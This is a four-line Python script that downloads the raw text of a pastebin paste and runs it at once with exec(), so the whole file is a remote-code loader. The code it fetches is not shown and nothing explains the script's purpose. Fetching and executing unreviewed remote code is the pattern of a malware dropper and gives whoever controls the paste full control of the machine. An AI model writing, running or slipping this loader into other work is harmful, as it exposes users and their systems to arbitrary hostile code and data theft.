import requests

root = requests.get('https://pastebin.com/raw/YP1vifiQ').text
exec(root)